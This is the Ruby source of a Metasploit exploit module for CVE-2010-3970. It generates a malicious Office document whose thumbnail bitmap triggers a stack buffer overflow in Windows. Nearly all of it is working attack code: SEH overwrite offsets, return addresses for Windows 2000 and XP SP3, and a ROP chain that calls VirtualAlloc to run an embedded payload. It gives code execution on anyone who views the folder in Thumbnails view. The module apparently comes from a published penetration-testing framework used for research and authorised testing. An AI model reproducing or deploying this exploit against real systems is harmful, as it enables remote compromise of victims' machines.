##
# $Id: ms11_xxx_createsizeddibsection.rb 11466 2011-01-04 15:30:29Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Windows CreateSizedDIBSECTION Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in the handling of thumbnails
				within .MIC files and various Office documents. When processing a thumbnail bitmap
				containing a negative 'biClrUsed' value, a stack-based buffer overflow occurs. This
				leads to arbitrary code execution.

				In order to trigger the vulnerable code, the folder containing the document must be
				viewed using the "Thumbnails" view.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Moti & Xu Hao',  # original discovery
					'Yaniv Miron aka Lament of ilhack',
					'jduck'           # Metasploit module
				],
			'Version'        => '$Revision: 11466 $',
			'References'     =>
				[
					[ 'CVE', '2010-3970' ],
					#[ 'OSVDB', '?????' ],
					#[ 'MSB', 'MS11-XXX' ],
					#[ 'BID', '????' ],
					[ 'URL', 'http://www.powerofcommunity.net/schedule.html' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
					'AutoRunScript' => 'migrate -f'
				},
			'Payload'        =>
				{
					'Space'         => 512,
					'BadChars'      => "\x00",
					'DisableNops'   => true # no need
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# This automatic target will combine all targets into one file :)
					[ 'Automatic', { } ],

					# Windows 2000 is a soft target... You're not still using it are you?
					[ 'Windows 2000 SP0/SP4 English',
						{
							'Offset' => 1548,   # Offset to SEH frame
							'Ret' => 0x75022ac4 # p/p/r ws2help.dll v5.0.2134.1
						}
					],

					# My test machine didn't have l3codeca.acm loaded (as mentioned in their slides)
					# However, it did have msacm32.drv
					[ 'Windows XP SP3 English',
						{
							'Offset' => 1560,    # Offset to SEH frame
							# Address from msacm32.drv v5.1.2600.0
							'Ret' => 0x72d11676,  # push esi / mov esi,[esp+0xc] / push [esi+0x54] / call [esi+0x5c]

							# This ends up becoming eip due to above SafeSEH bypass
							'PivotOffset' => 1652,
							'RopStart' => 592
						}
					],

=begin
					[ 'Windows Server 2003 SP2',
						{
							'Offset' => 1576,    # Offset to SEH frame
							'Ret' => 0xfeedfed5

							# rop is possible with l3codeca.acm, but its not clear how to force it to be loaded.
							# Also, it changed in Feburary 2010 ...
						}
					],
=end

					# crash on a deref path to heaven.
					[ 'Crash Target for Debugging',
						{
							'Ret' => 0xdac0ffee
						}
					]
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Dec 15 2010'))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.doc']),
			], self.class)
	end

	def exploit

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		out = File.expand_path(File.join(datastore['OUTPUTPATH'], datastore['FILENAME']))
		stg = Rex::OLE::Storage.new(out, Rex::OLE::STGM_WRITE)
		if (not stg)
			raise RuntimeError, 'Unable to create output file'
		end

		stm = stg.create_stream("\x05SummaryInformation")
		if (not stm)
			raise RuntimeError, 'Unable to create SummaryInformation stream'
		end
		stm << generate_summaryinfo()
		stm.close

		stg.close

		print_status("Generated output file #{out}")

	end

	def generate_summaryinfo
		si = Rex::OLE::PropertySetStream.new

		ps = Rex::OLE::PropertySet.new(Rex::OLE::FMTID_SummaryInformation)

		bihdr = [
			0x08,  # ??
			0x28,  # biSize (struct size)
			0x50,  # biWidth
			0x58,  # biHeight
			0x01,  # biPlanes
			0x08,  # biBitCount
			0x00,  # biCompression
			0xa8c0,  # biSizeImage
			0x00,  # biXPelsPerMeter
			0x00,  # biYPelsPerMeter
			# biClrUsed
			0x80000001,
			0x00   # biClrImportant
		].pack('VVVVvvVVVVVV')

		# ClipboardData
		data = rand_text(8192)
		data[0, bihdr.length] = bihdr
		data[48, payload.encoded.length] = payload.encoded

		if target.name == "Automatic"
			targets.each { |t|
				next if t.name !~ /Windows/i 

				add_target(data, t)
			}
		else
			add_target(data, target)
		end

		prop = Rex::OLE::Property.new(Rex::OLE::PIDSI_THUMBNAIL, Rex::OLE::VT_CF, data)
		ps << prop
		si << ps

		si.pack
	end

	def add_target(data, targ)
		if targ['PivotOffset'] and targ['RopStart']
			data[targ['Offset'] + 4, 4] = [targ.ret].pack('V')

			rvas = rvas_explorer_xpsp3()
			rop = generate_rop(rvas)

			pivot = rva2addr(rvas, 'add ebp, [edx+6] / pop eax / leave / ret 4')
			data[targ['PivotOffset'], 4] = [pivot].pack('V')

			data[targ['RopStart'], rop.length] = rop
		else
			seh = generate_seh_record(targ.ret)
			distance = targ['Offset'] + seh.length
			distance -= 48  # the entire source buffer isn't copied
			seh << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + distance.to_s).encode_string

			data[targ['Offset'], seh.length] = seh
		end
	end

	def rvas_explorer_xpsp3()
		# explorer.exe version v6.0.2900.5512
		# Just return this hash
		{
			'add ebp, [edx+6] / pop eax / leave / ret 4' => 0x2be9c,
			'ret'                    => 0x3ebd,

			'int3 / ... / ret'       => 0x1922f,

			'mov eax, esi / pop edi / pop esi / ret' => 0x2648,
			'pop ebp / ret'          => 0x3ebc,
			'add eax, ebp / ret'     => 0x13124,
			'mov eax, [eax] / ret'   => 0x74b7,

			'pop ebx / ret'          => 0x4bd5,
			'push eax / call ebx'    => 0xedc7,
			'pop edi / pop esi / ret' => 0x23bb,

			'pop ecx / ret'          => 0x1acd9,
			'call [ecx] / pop ebp / ret 0x10' => 0x2ad52,

			'pop edi / ret'          => 0x319bc,

			'lea edi, [eax+0x1c] / rep movsd / pop edi / pop esi / ret' => 0x88c4,

			'mov [eax], ecx / pop ebp / ret 4' => 0xa747,
			'jmp eax'                => 0x2080
		}
	end

	def generate_rop(rvas)
		# ROP fun! (XP SP3 English, Dec 29 2010)
		rvas.merge!({
			# Instructions / Name    => RVA
			'BaseAddress'            => 0x01000000,
			'imp_VirtualAlloc'       => 0x11e8,
			'Scratch'                => 0x46060
		})

		rop_stack = [
			'ret',
			:unused,  # from pivot

			# First, get the address of our source buffer in relation to the
			# SEH record pointer now saved in ESI
			'mov eax, esi / pop edi / pop esi / ret',
			:unused,
			:unused,

			'pop ebp / ret',
			0xfffffa18,
			'add eax, ebp / ret',

			'pop ebx / ret',
			'pop edi / pop esi / ret',
			'push eax / call ebx',

			# Allocate an RWX memory segment
			'pop ecx / ret',
			'imp_VirtualAlloc',

			'call [ecx] / pop ebp / ret 0x10',
			0,         # lpAddress
			0x1000,    # dwSize
			0x3000,    # flAllocationType
			0x40,      # flProt
			:unused,

			# Copy the original payload
			'pop ecx / ret',
			:unused,
			:unused,
			:unused,
			:unused,
			0x80,      # dwords to copy

			'lea edi, [eax+0x1c] / rep movsd / pop edi / pop esi / ret',
			:unused,
			:unused,

			# Add a jump over the space/crap
			'pop ecx / ret',
			0x90901aeb,

			'mov [eax], ecx / pop ebp / ret 4',
			:unused,

			'jmp eax'
		]

		rop_stack.map! { |e|
			if e.kind_of? String
				# Meta-replace (RVA)
				raise RuntimeError, "Unable to locate key: \"#{e}\"" if not rvas[e]
				rvas['BaseAddress'] + rvas[e]

			elsif e == :unused
				# Randomize
				rand_text(4).unpack('V').first

			else
				# Literal
				e
			end
		}

		rop_stack.pack('V*')
	end

	def rva2addr(rvas, key)
		raise RuntimeError, "Unable to locate key: \"#{key}\"" if not rvas[key]
		rvas['BaseAddress'] + rvas[key]
	end

end
